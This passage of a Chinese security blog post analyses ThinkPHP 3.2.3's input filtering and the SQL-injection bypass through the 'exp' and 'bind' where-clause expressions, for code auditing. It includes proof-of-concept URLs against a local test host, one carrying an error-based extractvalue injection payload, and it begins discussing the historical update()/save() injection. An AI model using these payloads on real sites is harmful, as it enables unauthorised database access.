<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> ( username<span class="hljs-operator">=</span><span class="hljs-string">&#x27;xy&#x27;</span> )<br></code></pre></td></tr></table></figure>

<ul>
<li>select()</li>
</ul>
<p>执行 select 查询，获取数据表中的多行记录</p>
<ul>
<li>find()</li>
</ul>
<p>执行 select 查询，读取数据表中的一行数据</p>
<p>示例：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Home</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-keyword">use</span> <span class="hljs-title">Think</span>\<span class="hljs-title">Controller</span>;<br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;name&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>TP 3还提供链式操作，假如我们现在要查询一个User表的满足状态为1的前10条记录，并希望按照用户的创建时间排序</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;status=1&#x27;</span>)-&gt;order(<span class="hljs-string">&#x27;create_time&#x27;</span>)-&gt;limit(<span class="hljs-number">10</span>)-&gt;select();<br></code></pre></td></tr></table></figure>

<h1 id="0x02-安全过滤机制"><a href="#0x02-安全过滤机制" class="headerlink" title="0x02 安全过滤机制"></a>0x02 安全过滤机制</h1><p>TP3 在<strong>I方法</strong>和数据库操作时都提供有自动安全过滤的操作</p>
<h2 id="I-方法的安全过滤"><a href="#I-方法的安全过滤" class="headerlink" title="I 方法的安全过滤"></a>I 方法的安全过滤</h2><blockquote>
<p>ThinkPHP/Common/functions.php</p>
</blockquote>
<p>下面对 <strong>I方法</strong> 的代码做了大量化简，保留了关键逻辑代码</p>
<ul>
<li><code>$name</code> 参数是一个字符串，前面提到的格式有 <code>get.id, post.name/s</code>，<strong>I方法</strong>就需要对这样的字符串做解析</li>
<li>首先<strong>I方法</strong>解析出<code>$name</code>字符串中接收数据的方法 <code>$method</code>，数据类型和数据 <code>$data</code></li>
<li>通过<code>$filter</code>方法对<code>$data</code>做过滤，一般<code>$filter</code>为空，就会调用系统默认过滤方式<code>htmlspecialchars</code></li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&#x27;DEFAULT_FILTER&#x27;</span>        =&gt;  <span class="hljs-string">&#x27;htmlspecialchars&#x27;</span>, <span class="hljs-comment">// 默认参数过滤方法 用于I函数...</span><br></code></pre></td></tr></table></figure>

<ul>
<li>最后 <code>$data</code> 还要通过 <code>think_filter()</code> 检查，就是匹配数据中是否具有敏感字符，如果 <code>$data</code> 匹配到敏感字符就在数据后添加一个空格，这步操作看似很奇怪，后面会讲这么做的用途</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">I</span>(<span class="hljs-params"><span class="hljs-variable">$name</span>,<span class="hljs-variable">$default</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$filter</span>=<span class="hljs-literal">null</span>,<span class="hljs-variable">$datas</span>=<span class="hljs-literal">null</span></span>) </span>&#123;<br>    <span class="hljs-keyword">if</span>(strpos(<span class="hljs-variable">$name</span>,<span class="hljs-string">&#x27;.&#x27;</span>)) &#123; <span class="hljs-comment">// 指定参数来源</span><br>        <span class="hljs-keyword">list</span>(<span class="hljs-variable">$method</span>,<span class="hljs-variable">$name</span>) =   explode(<span class="hljs-string">&#x27;.&#x27;</span>,<span class="hljs-variable">$name</span>,<span class="hljs-number">2</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123; <span class="hljs-comment">// 默认为自动判断</span><br>        <span class="hljs-variable">$method</span> =   <span class="hljs-string">&#x27;param&#x27;</span>;<br>    &#125;<br>    <span class="hljs-keyword">switch</span>(strtolower(<span class="hljs-variable">$method</span>)) &#123;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;get&#x27;</span>     :   <br>        	<span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_GET</span>;<br>        	<span class="hljs-keyword">break</span>;<br>        <span class="hljs-keyword">case</span> <span class="hljs-string">&#x27;post&#x27;</span>    :   <br>        	<span class="hljs-variable">$input</span> =&amp; <span class="hljs-variable">$_POST</span>;<br>        	<span class="hljs-keyword">break</span>;<br>        ……<br>    <span class="hljs-variable">$data</span> = <span class="hljs-variable">$input</span>;<br>		<span class="hljs-variable">$data</span> = <span class="hljs-variable">$input</span>[<span class="hljs-variable">$name</span>];<br>    <span class="hljs-comment">// 根据 $filter 过滤数据</span><br>    <span class="hljs-variable">$data</span> = is_array(<span class="hljs-variable">$data</span>) ? array_map_recursive(<span class="hljs-variable">$filter</span>,<span class="hljs-variable">$data</span>) : <span class="hljs-variable">$filter</span>(<span class="hljs-variable">$data</span>);<br>    <span class="hljs-comment">// 调用 think_filter()</span><br>    is_array(<span class="hljs-variable">$data</span>) &amp;&amp; array_walk_recursive(<span class="hljs-variable">$data</span>,<span class="hljs-string">&#x27;think_filter&#x27;</span>);<br>    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br>		<span class="hljs-comment">// 检查敏感字符</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>这里注意 thinkphp3.2.3 中敏感字符不包含BIND，该版本就因为这一点存在一个sql注入的风险</p>
<h2 id="数据库操作的安全过滤"><a href="#数据库操作的安全过滤" class="headerlink" title="数据库操作的安全过滤"></a>数据库操作的安全过滤</h2><p>通过<strong>I方法</strong>获取外部数据默认会做一些安全过滤，上面看到的系统默认配置有 htmlspecialchars，这个方法能防御大部分的xss注入。因为现在很多程序会使用预编译，所以 TP 中一般不采用<strong>I方法</strong>对外部数据做sql注入的过滤</p>
<p>所以 TP3 在数据库操作上也有自己的安全过滤方式，TP3有自己的预编译处理方式，在没有使用预编译的情况下，TP3才会做addslash()这样的过滤，而TP3中出现的sql注入问题就是在没有使用预编译的情况下，忽略了一些该过滤的地方</p>
<p>在这里实在佩服挖到这些漏洞的大佬，最近看MVC模式的代码理解流程都很困难，他们却在复杂的代码中找到关键的问题</p>
<h3 id="示例程序"><a href="#示例程序" class="headerlink" title="示例程序"></a>示例程序</h3><p>本小节主要通过如下示例代码分析TP3是如何处理sql操作，如何拼接sql语句，如何做安全过滤等操作</p>
<p>这是一个常见的外部输入where查询条件的sql操作，对TP3数据库操作有一定的普适性</p>
<blockquote>
<p>Application/Home/Controller/IndexController.class.php</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexController</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Controller</span> </span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">test</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable">$name</span> = I(<span class="hljs-string">&#x27;GET.name&#x27;</span>);<br>        <span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;user&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br>        <span class="hljs-variable">$User</span>-&gt;field(<span class="hljs-string">&#x27;username,age&#x27;</span>)-&gt;where(<span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;username&#x27;</span>=&gt;<span class="hljs-variable">$name</span>))-&gt;select();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>访问下面的链接</p>
<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>tp.test:<span class="hljs-number">8888</span><span class="hljs-regexp">/index.php/</span>home<span class="hljs-regexp">/index/</span>test?name=s<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure>

<p>最终执行的sql语句为：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;s\&#x27;&#x27;</span><br></code></pre></td></tr></table></figure>

<p>下面将仔细分析示例程序sql执行的流程</p>
<p>按照链式操作的顺序，会依次执行field()、where()、select()。field()用于处理查询的字段，这里数据不可控，我们也不关注了</p>
<h3 id="where-方法"><a href="#where-方法" class="headerlink" title="where()方法"></a>where()方法</h3><p>先看where()的逻辑，<code>where()</code> 用于构造sql语句的<strong>where条件语句部分</strong>，这是常见的sql注入点。前面提到，模型类提供的<code>where()</code>方法可以接收数组参数或字符串参数 <code>$where</code>，然后 <code>where()</code> 方法将会把相关数据解析到模型对象的 <code>options</code> 数组属性中，用于后续拼接完整的sql语句</p>
<ul>
<li>如果 <code>$where</code> 为字符串时，<code>$parse</code> 为传入 <code>where()</code> 的另一个参数，将会被<code>escapeString</code>过滤，然后将<code>$parse</code>格式化放在<code>$where</code>中，最后该字符串的值被放在 <code>$where[&#39;_string&#39;]</code> 中。这里过滤的明明白白，就不在考虑这种写法的sql注入问题了</li>
<li>如果 <code>$where</code> 为数组，也是官方推荐的一种方式，在 <code>where()</code> 方法中并没有直接过滤，我们需要关注后续对该值的处理</li>
<li><code>$where</code> 最终将放在当前模型对象的 <code>options[&#39;where&#39;]</code> 中，供后面处理</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Model.class.php</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">where</span>(<span class="hljs-params"><span class="hljs-variable">$where</span>,<span class="hljs-variable">$parse</span>=<span class="hljs-literal">null</span></span>)</span>&#123;<br>        <span class="hljs-keyword">if</span>(!is_null(<span class="hljs-variable">$parse</span>) &amp;&amp; is_string(<span class="hljs-variable">$where</span>)) &#123;<br>            <span class="hljs-variable">$parse</span> = array_map(<span class="hljs-keyword">array</span>(<span class="hljs-keyword">$this</span>-&gt;db,<span class="hljs-string">&#x27;escapeString&#x27;</span>),<span class="hljs-variable">$parse</span>);<br>            <span class="hljs-variable">$where</span> =   vsprintf(<span class="hljs-variable">$where</span>,<span class="hljs-variable">$parse</span>);<br>        &#125;<br>        <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$where</span>) &amp;&amp; <span class="hljs-string">&#x27;&#x27;</span> != <span class="hljs-variable">$where</span>)&#123;<br>            <span class="hljs-variable">$map</span>    =   <span class="hljs-keyword">array</span>();<br>            <span class="hljs-variable">$map</span>[<span class="hljs-string">&#x27;_string&#x27;</span>]   =   <span class="hljs-variable">$where</span>;<br>            <span class="hljs-variable">$where</span>  =   <span class="hljs-variable">$map</span>;<br>        &#125;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>]))&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>] =   array_merge(<span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>],<span class="hljs-variable">$where</span>);<br>        &#125;<span class="hljs-keyword">else</span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;options[<span class="hljs-string">&#x27;where&#x27;</span>] =   <span class="hljs-variable">$where</span>;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="select-方法"><a href="#select-方法" class="headerlink" title="select() 方法"></a>select() 方法</h3><p>上面知道如果传入where()的参数为字符串，则直接会被过滤，那传入数组参数是否会经过安全检测呢？</p>
<p>接下来看看select()是怎么处理的，where()方法将<strong>where字段</strong>部分数据放到了模型对象的options数组属性中保存，select()方法将主要通过options数组组成最终的sql语句，其底层将由 <code>ThinkPHP/Library/Think/Db/Driver.class.php</code> 封装完成，过程比较复杂，下面用一张图简诉其流程</p>
<p>![image-20210726185914064](img/ThinkPHP3.x 漏洞总结/image-20210726185914064.png)</p>
<p>可以看到最终的sql语句将由 buildSelectSql() 完成，其中由parseTable(),parseWhere()等若干方法完成sql语句各个set字段的组成</p>
<p>其中where字段由parseWhere()解析，因为前面对字符串参数已经过滤了，parseWhere()并没有在做过滤（具体代码上图忽略了），而是对数组参数进行了过滤，处理细节位于parseWhereItem()，我们需要关注parseWhereItem()是否做到了严丝合缝</p>
<h3 id="parseWhereItem"><a href="#parseWhereItem" class="headerlink" title="parseWhereItem()"></a>parseWhereItem()</h3><ul>
<li>**parseWhereItem()**接收两个参数 <code>$key</code> 和 <code>$val</code>，分别来自为 <code>opention[&#39;where&#39;]</code> 的键和值</li>
<li>首先需要知道的是最终过滤的方法是 <code>parseValue()</code>，过滤的值是 <code>$val</code>，过滤后的 <code>$var</code> 和 <code>$key</code> 组成 <code>$whereStr</code> 即最终的where字段</li>
<li>当 <code>$val</code> 为数组形式时，会进入一个表达式判断，<code>$exp=$val[0]</code>，<code>$exp</code>即为表达式，sql代码的表达式有EQ（等于）、LIKE（模糊查询等）……<ul>
<li>可以看到，当 <code>$exp</code> 的值为<strong>bind，exp，IN 运算符</strong>时，不会经过 <strong>parseValue()</strong> 的过滤，那么这里就有可能存在一种绕过过滤的可能</li>
<li><code>$exp</code> 值为bind时，where语句会加上 <code>= :</code>，这会影响后面注入的语句（不过有人发现delete等方法可以消除该符号的影响，这个漏洞后面会具体分析）；为IN运算符时，最后构造的sql语句会加上in运算符，稍有干扰；值为exp似乎是最佳选择</li>
</ul>
</li>
<li>当 <code>$val</code> 不为数组形式时，必会受到parseValue()的过滤，遂放弃</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Db/Driver.class.php	line:547-616</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhereItem</span>(<span class="hljs-params"><span class="hljs-variable">$key</span>,<span class="hljs-variable">$val</span></span>) </span>&#123;<br>        <span class="hljs-variable">$whereStr</span> = <span class="hljs-string">&#x27;&#x27;</span>;<br>        <span class="hljs-keyword">if</span>(is_array(<span class="hljs-variable">$val</span>)) &#123;<br>            <span class="hljs-keyword">if</span>(is_string(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>])) &#123;<br>								<span class="hljs-variable">$exp</span>	=	strtolower(<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>                <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(eq|neq|gt|egt|lt|elt)$/&#x27;</span>,<span class="hljs-variable">$exp</span>)) &#123; <span class="hljs-comment">// 比较运算</span><br>                    parseValue()……;<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notlike|like)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123;<span class="hljs-comment">// 模糊查找</span><br>                    parseValue()……;<br>                &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;exp&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>                    <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notin|not in|in)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// IN 运算</span><br>                    <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &amp;&amp; <span class="hljs-string">&#x27;exp&#x27;</span>==<span class="hljs-variable">$val</span>[<span class="hljs-number">2</span>]) &#123;<br>                        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;exp[<span class="hljs-variable">$exp</span>].<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>                    &#125;<span class="hljs-keyword">else</span>&#123;<br>                        parseValue();<br>                    &#125;<br>                &#125;<span class="hljs-keyword">elseif</span>(preg_match(<span class="hljs-string">&#x27;/^(notbetween|not between|between)$/&#x27;</span>,<span class="hljs-variable">$exp</span>))&#123; <span class="hljs-comment">// BETWEEN运算</span><br>                   parseValue()……；<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    E(L(<span class="hljs-string">&#x27;_EXPRESS_ERROR_&#x27;</span>).<span class="hljs-string">&#x27;:&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">0</span>]);<br>                &#125;<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                ……<br>            &#125;<br>        &#125;<span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-comment">//对字符串类型字段采用模糊匹配</span><br>            <span class="hljs-variable">$likeFields</span>   =   <span class="hljs-keyword">$this</span>-&gt;config[<span class="hljs-string">&#x27;db_like_fields&#x27;</span>];<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$likeFields</span> &amp;&amp; preg_match(<span class="hljs-string">&#x27;/^(&#x27;</span>.<span class="hljs-variable">$likeFields</span>.<span class="hljs-string">&#x27;)$/i&#x27;</span>,<span class="hljs-variable">$key</span>)) &#123;<br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; LIKE &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;parseValue(<span class="hljs-string">&#x27;%&#x27;</span>.<span class="hljs-variable">$val</span>.<span class="hljs-string">&#x27;%&#x27;</span>);<br>            &#125;<span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = &#x27;</span>.<span class="hljs-keyword">$this</span>-&gt;parseValue(<span class="hljs-variable">$val</span>);<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable">$whereStr</span>;<br>&#125;<br></code></pre></td></tr></table></figure>

<p>然后就构造一个poc验证一下</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=exp&amp;name[1]=111&#x27;<br></code></pre></td></tr></table></figure>

<p>然后跟踪调试过程发现并没有按照预想的进入<code>&#39;exp&#39; == $exp</code>的逻辑，原因是我们传入的exp被加了一个空格，这似乎和<strong>I方法</strong>有关系</p>
<img src="img/ThinkPHP3.x 漏洞总结/image-20210727161026613.png" srcset="/img/loading.gif" lazyload alt="image-20210727161026613" style="zoom:50%;" />

<p>所以这里也发现了官方为什么强调要使用I方法接收外部数据，<strong>如果没有使用I方法，而是直接使用<code>$_GET</code>等接收外部变量</strong>，那么这里就有sql注入的问题</p>
<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://tp.test:8888/index.php/home/index/test?name</span>[<span class="hljs-string">0</span>]=exp&amp;name[1]==<span class="hljs-emphasis">&#x27;1&#x27;</span> and (extractvalue(1,concat(0x7e,(select user()),0x7e))) #<br></code></pre></td></tr></table></figure>

<p>实际注入sql语句：</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">SELECT</span> `username`,`age` <span class="hljs-keyword">FROM</span> `think_user` <span class="hljs-keyword">WHERE</span> `username` <span class="hljs-operator">=</span><span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> (extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>()),<span class="hljs-number">0x7e</span>)))<br></code></pre></td></tr></table></figure>

<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>目前分析了 ThinkPHP V3.2.3对通过<strong>I方法</strong>对输入变量的安全过滤流程、数据库在解析select语句中的where字段时的安全过滤流程。也发现如果没有按照规范的方法使用 ThinkPHP 也是有可能存在SQL注入问题的。这些不规范的写法也是代码审计时需要找出的问题</p>
<h1 id="0x03-历史漏洞"><a href="#0x03-历史漏洞" class="headerlink" title="0x03 历史漏洞"></a>0x03 历史漏洞</h1><h2 id="update注入漏洞"><a href="#update注入漏洞" class="headerlink" title="update注入漏洞"></a>update注入漏洞</h2><p>在安全过滤机制一节中主要分析了 select() 方法对 where() 传入的数组参数的处理过程，其中遇到了这样的情况：</p>
<ul>
<li><code>$exp</code>  的值为 ‘bind’ 时，构造的 where 字段中间会受到 “ = : “ 符号的影响，但是有人却找到了模型类的save()方法可以消除” : “的影响，最终造成sql注入漏洞，该小节就是关注这一点</li>
<li><code>$exp</code> 的值为 ‘exp’ 时，基本不会受到影响，但 exp 在 <code>think_filter()</code> 中是特殊字符，<code>$exp</code> 最终值会被加空格，无法进入到该逻辑中</li>
</ul>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//	ThinkPHP/Library/Think/Db/Driver.class.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">parseWhereItem</span>(<span class="hljs-params"></span>)</span>&#123;<br>……<br>    <span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;bind&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; = :&#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>    &#125;<span class="hljs-keyword">elseif</span>(<span class="hljs-string">&#x27;exp&#x27;</span> == <span class="hljs-variable">$exp</span> )&#123; <span class="hljs-comment">// 使用表达式</span><br>        <span class="hljs-variable">$whereStr</span> .= <span class="hljs-variable">$key</span>.<span class="hljs-string">&#x27; &#x27;</span>.<span class="hljs-variable">$val</span>[<span class="hljs-number">1</span>];<br>    &#125;<br>……<br>&#125;<br><span class="hljs-comment">//	ThinkPHP/Common/functions.php</span><br><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">think_filter</span>(<span class="hljs-params">&amp;<span class="hljs-variable">$value</span></span>)</span>&#123;<br>		<span class="hljs-comment">// TODO 其他安全过滤</span><br>		<span class="hljs-comment">// 过滤查询特殊字符</span><br>    <span class="hljs-keyword">if</span>(preg_match(<span class="hljs-string">&#x27;/^(EXP|NEQ|GT|EGT|LT|ELT|OR|XOR|LIKE|NOTLIKE|NOT BETWEEN|NOTBETWEEN|BETWEEN|NOTIN|NOT IN|IN)$/i&#x27;</span>,<span class="hljs-variable">$value</span>))&#123;<br>        <span class="hljs-variable">$value</span> .= <span class="hljs-string">&#x27; &#x27;</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>

<h3 id="save-的使用"><a href="#save-的使用" class="headerlink" title="save()的使用"></a>save()的使用</h3><p>ThinkPHP的模型基类使用save()方法实现了SQL update的操作，用法如下，要更改的数据需要通过数关联组形式传递</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-variable">$User</span> = M(<span class="hljs-string">&quot;User&quot;</span>); <span class="hljs-comment">// 实例化User对象</span><br><span class="hljs-comment">// 要修改的数据对象属性赋值</span><br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;name&#x27;</span>] = <span class="hljs-string">&#x27;ThinkPHP&#x27;</span>;<br><span class="hljs-variable">$data</span>[<span class="hljs-string">&#x27;email&#x27;</span>] = <span class="hljs-string">&#x27;ThinkPHP@gmail.com&#x27;</span>;<br><span class="hljs-variable">$User</span>-&gt;where(<span class="hljs-string">&#x27;id=5&#x27;</span>)-&gt;save(<span class="hljs-variable">$data</span>); <span class="hljs-comment">// 根据条件更新记录</span><br></code></pre></td></tr></table></figure>

<p>也可以改成对象方式来操作：</p>
